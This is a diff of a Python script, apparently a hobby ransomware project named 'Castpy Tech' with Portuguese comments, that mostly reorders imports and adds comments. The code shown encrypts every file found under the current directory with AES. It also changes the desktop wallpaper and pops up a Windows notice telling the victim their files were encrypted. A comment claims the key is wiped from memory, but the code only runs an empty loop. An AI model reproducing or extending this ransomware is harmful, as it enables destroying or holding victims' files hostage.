@@ -1,24 +1,41 @@
-from Crypto.Cipher import AES
-import pygame
+#Lib para criar notificações no windows
 from win10toast import ToastNotifier
-import ctypes
+
+#Lib para Cifrar dados e criptografar
 from Crypto.Util import Counter
-import pyfiglet
-import Discovery
-import argparse
-import secrets
+from Crypto.Cipher import AES
 import Crypter
+import ctypes
+
+#Criar token com quantidades
+import secrets
+
+#Tocar musica
+import pygame
+
+#Módulo de decobrir arquivos
+import Discovery
+
+#Todos os outros
+import pyfiglet
+import argparse
 import os
 
 
 #Chave de desencriptação
 HARDCODED_KEY = secrets.token_bytes(16)
 
+
+
+#Função que captura o argumento passado ao executar o script
+#Por padrão o script só encripta os arquivos
 def getParse():
     parser = argparse.ArgumentParser(description="Castpy Tech")
     parser.add_argument('-d', '--decrypt', help='Decripta os arquivos [Default: no]', action='store_true')
     return parser
 
+
+#Função principal
 def main():
     parser = getParse()
     args = vars(parser.parse_args())
@@ -53,10 +70,15 @@ def main():
         for filename in Discovery.discoverFile(currentDir):
             Crypter.changeFiles(filename, cryptFN)
 
+
+
     #Limpando a chave de criptografia da memória
 
     for i in range(100):
         pass
+
+
+    #Zoação no desktop
 
     if not decrypt:
         SPI_SETDESKWALLPAPER = 20
@@ -72,8 +94,6 @@ def main():
             os.makedirs(folder_path)
             toaster = ToastNotifier()
             toaster.show_toast("Castpy Tech", "Você foi criptografado", duration=0.2)
-
-
 
 
 
